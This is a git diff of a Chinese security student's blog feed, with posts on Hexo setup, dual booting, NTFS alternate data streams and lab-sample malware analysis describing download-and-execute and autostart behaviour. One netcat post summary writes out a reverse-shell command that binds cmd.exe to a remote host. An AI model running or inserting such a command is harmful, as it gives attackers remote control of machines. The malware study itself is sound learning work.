@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://18428381824.github.io/"/>
-  <updated>2017-10-25T12:17:26.608Z</updated>
+  <updated>2017-11-05T03:04:43.849Z</updated>
   <id>http://18428381824.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://18428381824.github.io/2017/11/05/hexo%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/"/>
+    <id>http://18428381824.github.io/2017/11/05/hexo博客恢复/</id>
+    <published>2017-11-05T03:04:43.770Z</published>
+    <updated>2017-11-05T03:04:43.849Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>title: 重装系统hexo恢复<br>date: 2017-11-05<br>time: 15-38-39<br>tags:</p><ul><li>杂学<br>categories: 杂学</li></ul><hr><h2 id="1-安装node-js和git"><a href="#1-安装node-js和git" class="headerlink" title="1.安装node.js和git"></a>1.安装node.js和git</h2><p> 这个不用多说，直接下载安装就行了。</p><h2 id="2-配置-git-个人信息，生成新的-ssh-密钥："><a href="#2-配置-git-个人信息，生成新的-ssh-密钥：" class="headerlink" title="2.配置 git 个人信息，生成新的 ssh 密钥："></a>2.配置 git 个人信息，生成新的 ssh 密钥：</h2><p>git config –global user.name “xxxxxx”<br>git config –global user.email “xxxxxx”<br>ssh-keygen -t rsa -C “xxxxxxxx(邮箱)”</p><h2 id="3-添加公钥"><a href="#3-添加公钥" class="headerlink" title="3.添加公钥"></a>3.添加公钥</h2><p>在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。</p><h2 id="4-安装hexo"><a href="#4-安装hexo" class="headerlink" title="4.安装hexo"></a>4.安装hexo</h2><p>建议先<br>npm install cnpm -g –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="external">https://registry.npm.taobao.org</a><br>安装的时候 用cpm 代替npm<br>这样的话npm 安装比较快而且不容易失败<br>cnpm install hexo-cli -g</p><h2 id="5-删除博客文件夹文件，保留部分"><a href="#5-删除博客文件夹文件，保留部分" class="headerlink" title="5.删除博客文件夹文件，保留部分"></a>5.删除博客文件夹文件，保留部分</h2><p>打开原来的博客文件夹,只需保留_config.yml，theme/，source/，scaffolds/，package.json，.gitignore 这些项目，删除其他的文件。</p><h2 id="6-git-bush"><a href="#6-git-bush" class="headerlink" title="6.git bush"></a>6.git bush</h2><p>在本文件夹下git bush,运行cnpm install</p><h2 id="7-安装部署插件"><a href="#7-安装部署插件" class="headerlink" title="7.安装部署插件"></a>7.安装部署插件</h2><p>npm install hexo-deployer-git –save</p><h2 id="8-测试"><a href="#8-测试" class="headerlink" title="8.测试"></a>8.测试</h2><p>此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;hr&gt;
+&lt;p&gt;title: 重装系统hexo恢复&lt;br&gt;date: 2017-11-05&lt;br&gt;time: 15-38-39&lt;br&gt;tags:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;杂学&lt;br&gt;categories: 杂学&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&quot;1-安装node-
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>对抗反汇编分析</title>
@@ -96,27 +123,32 @@
   </entry>
   
   <entry>
-    <title>恶意代码重定向</title>
-    <link href="http://18428381824.github.io/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/"/>
-    <id>http://18428381824.github.io/2017/10/16/恶意代码重定向/</id>
+    <title>双系统安装（win10+ubuntu）</title>
+    <link href="http://18428381824.github.io/2017/10/16/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/"/>
+    <id>http://18428381824.github.io/2017/10/16/双系统安装/</id>
     <published>2017-10-15T16:00:00.000Z</published>
-    <updated>2017-10-25T07:11:55.201Z</updated>
+    <updated>2017-10-25T07:36:25.876Z</updated>
     
-    <content type="html"><![CDATA[<p>&emsp;1.首先用strings查看字符串，发现<a href="http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p><pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，InternetReadFileInternetCloseHandleInternetOpenUrlAInternetOpenAWININET.dllURLDownloadToCacheFileA </code></pre><p>&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/ODPMB8W.png" alt=""><br><img src="https://i.imgur.com/qDJ4DI5.png" alt=""><br>这些函数，这些都是重要信息需要关注的。</p><p>&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a href="http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p><p><img src="https://i.imgur.com/ht0pUfZ.png" alt=""></p><p>&emsp;&emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a href="http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。" target="_blank" rel="external">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p><p><img src="https://i.imgur.com/akX3WUw.png" alt=""></p><p>&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>]]></content>
+    <content type="html"><![CDATA[<p>1.我选择的 是win10加ubuntu双系统。</p><p>2.准备工作</p><pre><code>U盘一个16gwin10系统ubuntu系统</code></pre><p>3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。</p><p>4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。</p><p>其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。/boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分/，15g-20g左右，剩下的可以全部给/home。引导驱动器选择/boot,然后继续安装正常方式来装就好了。</p><p>4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择/boot对应的就好了。此时重启你就会发现有两个候选操作系统了。</p><p><img src="https://i.imgur.com/prFcTXH.png" alt=""></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;&amp;emsp;1.首先用strings查看字符串，发现&lt;a href=&quot;http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：&quot; target=&quot;_b
+        &lt;p&gt;1.我选择的 是win10加ubuntu双系统。&lt;/p&gt;
+&lt;p&gt;2.准备工作&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;U盘一个16g
+win10系统
+ubuntu系统
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使
       
     
     </summary>
     
-      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+      <category term="杂学" scheme="http://18428381824.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
     
     
-      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+      <category term="杂学" scheme="http://18428381824.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
     
   </entry>
   
@@ -150,32 +182,27 @@
   </entry>
   
   <entry>
-    <title>双系统安装（win10+ubuntu）</title>
-    <link href="http://18428381824.github.io/2017/10/16/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/"/>
-    <id>http://18428381824.github.io/2017/10/16/双系统安装/</id>
+    <title>恶意代码重定向</title>
+    <link href="http://18428381824.github.io/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/"/>
+    <id>http://18428381824.github.io/2017/10/16/恶意代码重定向/</id>
     <published>2017-10-15T16:00:00.000Z</published>
-    <updated>2017-10-25T07:36:25.876Z</updated>
+    <updated>2017-10-25T07:11:55.201Z</updated>
     
-    <content type="html"><![CDATA[<p>1.我选择的 是win10加ubuntu双系统。</p><p>2.准备工作</p><pre><code>U盘一个16gwin10系统ubuntu系统</code></pre><p>3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。</p><p>4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。</p><p>其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。/boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分/，15g-20g左右，剩下的可以全部给/home。引导驱动器选择/boot,然后继续安装正常方式来装就好了。</p><p>4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择/boot对应的就好了。此时重启你就会发现有两个候选操作系统了。</p><p><img src="https://i.imgur.com/prFcTXH.png" alt=""></p>]]></content>
+    <content type="html"><![CDATA[<p>&emsp;1.首先用strings查看字符串，发现<a href="http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p><pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，InternetReadFileInternetCloseHandleInternetOpenUrlAInternetOpenAWININET.dllURLDownloadToCacheFileA </code></pre><p>&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/ODPMB8W.png" alt=""><br><img src="https://i.imgur.com/qDJ4DI5.png" alt=""><br>这些函数，这些都是重要信息需要关注的。</p><p>&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a href="http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p><p><img src="https://i.imgur.com/ht0pUfZ.png" alt=""></p><p>&emsp;&emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a href="http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。" target="_blank" rel="external">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p><p><img src="https://i.imgur.com/akX3WUw.png" alt=""></p><p>&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;1.我选择的 是win10加ubuntu双系统。&lt;/p&gt;
-&lt;p&gt;2.准备工作&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;U盘一个16g
-win10系统
-ubuntu系统
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使
+        &lt;p&gt;&amp;emsp;1.首先用strings查看字符串，发现&lt;a href=&quot;http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：&quot; target=&quot;_b
       
     
     </summary>
     
-      <category term="杂学" scheme="http://18428381824.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
     
     
-      <category term="杂学" scheme="http://18428381824.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
     
   </entry>
   
@@ -317,58 +344,6 @@ ubuntu系统
   </entry>
   
   <entry>
-    <title>字符串</title>
-    <link href="http://18428381824.github.io/2017/08/06/strings/"/>
-    <id>http://18428381824.github.io/2017/08/06/strings/</id>
-    <published>2017-08-05T16:00:00.000Z</published>
-    <updated>2017-08-06T08:59:08.244Z</updated>
-    
-    <content type="html"><![CDATA[<p>1 字符串添加</p><p>qq=’1265616844’<br>driver.get(‘<a href="http://user.qzone.qq.com/{}/311&#39;.format(qq" target="_blank" rel="external">http://user.qzone.qq.com/{}/311&#39;.format(qq</a>))<br>如上，在一堆字符串中添加某个字符串，可以用如上的方式</p><p>2.中文字符串</p><pre><code># _*_ coding: utf-8 _*_</code></pre><p>python 文件首行增加这一行，才可以输出中文，python默认以ASCII码来解析<br>对于windows的python文件保存为带bom 的utf-8也可以实现这个功能<br>文件的声明编码要和实际文件保存的编码一致，不然可能保存为gbk<br>要想命令行输出中文还要添加</p><pre><code>de_str1=str1.decode(&apos;utf-8&apos;)</code></pre><p>才可以在命令行正常输出中文</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;1 字符串添加&lt;/p&gt;
-&lt;p&gt;qq=’1265616844’&lt;br&gt;driver.get(‘&lt;a href=&quot;http://user.qzone.qq.com/{}/311&amp;#39;.format(qq&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;htt
-      
-    
-    </summary>
-    
-      <category term="编程" scheme="http://18428381824.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
-    
-    
-      <category term="编程" scheme="http://18428381824.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>数据隐藏-ADS</title>
-    <link href="http://18428381824.github.io/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/"/>
-    <id>http://18428381824.github.io/2017/08/06/数据隐藏-ADS/</id>
-    <published>2017-08-05T16:00:00.000Z</published>
-    <updated>2017-08-06T09:08:12.659Z</updated>
-    
-    <content type="html"><![CDATA[<p>数据隐藏的一种方式–ADS</p><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。</p><p>详见<a href="https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin" target="_blank" rel="external">ADS</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;数据隐藏的一种方式–ADS&lt;/p&gt;
-&lt;p&gt;NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用N
-      
-    
-    </summary>
-    
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-    
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-  </entry>
-  
-  <entry>
     <title>netcat-反向shell</title>
     <link href="http://18428381824.github.io/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/"/>
     <id>http://18428381824.github.io/2017/08/06/netcat—反向shell/</id>
@@ -384,33 +359,6 @@ ubuntu系统
         &lt;p&gt;利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell&lt;/p&gt;
 &lt;p&gt;1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe&lt;/p&gt;
 &lt;p&gt;2.linux 主机执行 nc  -l 
-      
-    
-    </summary>
-    
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-    
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>进程替换的一种方式</title>
-    <link href="http://18428381824.github.io/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/"/>
-    <id>http://18428381824.github.io/2017/08/06/进程替换的一种检测方式/</id>
-    <published>2017-08-05T16:00:00.000Z</published>
-    <updated>2017-08-06T09:19:12.130Z</updated>
-    
-    <content type="html"><![CDATA[<p>进程替换问题</p><p>svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。</p><p><img src="http://i.imgur.com/3u192lY.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;进程替换问题&lt;/p&gt;
-&lt;p&gt;svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/3u192lY.png&quot; alt=&quot;&quot;&gt;&lt;
       
     
     </summary>
@@ -453,6 +401,85 @@ AX=0FF80H
   </entry>
   
   <entry>
+    <title>数据隐藏-ADS</title>
+    <link href="http://18428381824.github.io/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/"/>
+    <id>http://18428381824.github.io/2017/08/06/数据隐藏-ADS/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T09:08:12.659Z</updated>
+    
+    <content type="html"><![CDATA[<p>数据隐藏的一种方式–ADS</p><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。</p><p>详见<a href="https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin" target="_blank" rel="external">ADS</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;数据隐藏的一种方式–ADS&lt;/p&gt;
+&lt;p&gt;NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用N
+      
+    
+    </summary>
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>字符串</title>
+    <link href="http://18428381824.github.io/2017/08/06/strings/"/>
+    <id>http://18428381824.github.io/2017/08/06/strings/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T08:59:08.244Z</updated>
+    
+    <content type="html"><![CDATA[<p>1 字符串添加</p><p>qq=’1265616844’<br>driver.get(‘<a href="http://user.qzone.qq.com/{}/311&#39;.format(qq" target="_blank" rel="external">http://user.qzone.qq.com/{}/311&#39;.format(qq</a>))<br>如上，在一堆字符串中添加某个字符串，可以用如上的方式</p><p>2.中文字符串</p><pre><code># _*_ coding: utf-8 _*_</code></pre><p>python 文件首行增加这一行，才可以输出中文，python默认以ASCII码来解析<br>对于windows的python文件保存为带bom 的utf-8也可以实现这个功能<br>文件的声明编码要和实际文件保存的编码一致，不然可能保存为gbk<br>要想命令行输出中文还要添加</p><pre><code>de_str1=str1.decode(&apos;utf-8&apos;)</code></pre><p>才可以在命令行正常输出中文</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1 字符串添加&lt;/p&gt;
+&lt;p&gt;qq=’1265616844’&lt;br&gt;driver.get(‘&lt;a href=&quot;http://user.qzone.qq.com/{}/311&amp;#39;.format(qq&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;htt
+      
+    
+    </summary>
+    
+      <category term="编程" scheme="http://18428381824.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="编程" scheme="http://18428381824.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>进程替换的一种方式</title>
+    <link href="http://18428381824.github.io/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/"/>
+    <id>http://18428381824.github.io/2017/08/06/进程替换的一种检测方式/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T09:19:12.130Z</updated>
+    
+    <content type="html"><![CDATA[<p>进程替换问题</p><p>svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。</p><p><img src="http://i.imgur.com/3u192lY.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;进程替换问题&lt;/p&gt;
+&lt;p&gt;svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/3u192lY.png&quot; alt=&quot;&quot;&gt;&lt;
+      
+    
+    </summary>
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
     <title>dll加载和劫持</title>
     <link href="http://18428381824.github.io/2017/08/03/dll%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%AB%E6%8C%81/"/>
     <id>http://18428381824.github.io/2017/08/03/dll加载和劫持/</id>
@@ -482,29 +509,28 @@ AX=0FF80H
   </entry>
   
   <entry>
-    <title>恶意代码分析第一记</title>
-    <link href="http://18428381824.github.io/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%AE%B0/"/>
-    <id>http://18428381824.github.io/2017/08/01/恶意代码分析第一记/</id>
+    <title>一个简单的crackme</title>
+    <link href="http://18428381824.github.io/2017/08/01/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84crackme/"/>
+    <id>http://18428381824.github.io/2017/08/01/一个简单的crackme/</id>
     <published>2017-07-31T16:00:00.000Z</published>
-    <updated>2017-08-01T02:06:27.377Z</updated>
+    <updated>2017-08-02T13:57:37.472Z</updated>
     
-    <content type="html"><![CDATA[<p>###步骤如下</p><p>1.分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe,链接就不贴了，百度一搜就可以搜到了。</p><p>2.首先在虚拟机里准备好必要的工具，静态分析工具包括PEView,strings,(IDA),Dependency Walkler,Resource Hacker,PEID,PEexplorer等。动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。</p><p>3.首先对样本进行静态分析。</p><p>•     PEID 查壳</p><p><img src="http://i.imgur.com/4usSk9D.png" alt=""></p><p>发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。</p><p>• PEVIew</p><p>抱着可能有意外之喜的心态，打开Peview,查看导入表，果不其然，只有一个ExitProcess函数,</p><p>• Strings</p><p>用strings.exe程序查看字符串，发现字符串并没有被混淆，看到了很多字符串，其中vm32to64.exe看起来像是一个释放的可执行文件，后面的注册表SOFTWARE\Microsoft\Windows\CurrentVersion\Run是启动项的位置，猜测程序添加了开机自启动。还有一个网址www.practicalmalwareanalysis.com 程序应该是有联网活动。其实导入表和字符串也可以通过IDA来看，总之方法很多。</p><p><img src="http://i.imgur.com/OhjexaS.png" alt="">    </p><p><img src="http://i.imgur.com/wbTQjEZ.png" alt=""></p><p>4.动态分析<br>首先运行process monitor,process explorer,ApateDNS，regshot,等工具。然后运行样本程序，果然在ApateDNS中发现了联网活动。</p><p><img src="http://i.imgur.com/q2coLee.png" alt=""></p><p>在process monitor 中监控到了设置注册表启动的现象。注意要晓得哪些东西是系统正常的行为，即噪声，如图除了第二条其他都是噪声。在文件界面我们选择过滤创建文件和写入文件，如图发现了向vmx32to64.exe写文件的行为。此时要注意该程序的大小是否和样本的大小一致，判断是否是复制行为。</p><p><img src="http://i.imgur.com/jVOp29K.png" alt=""></p>]]></content>
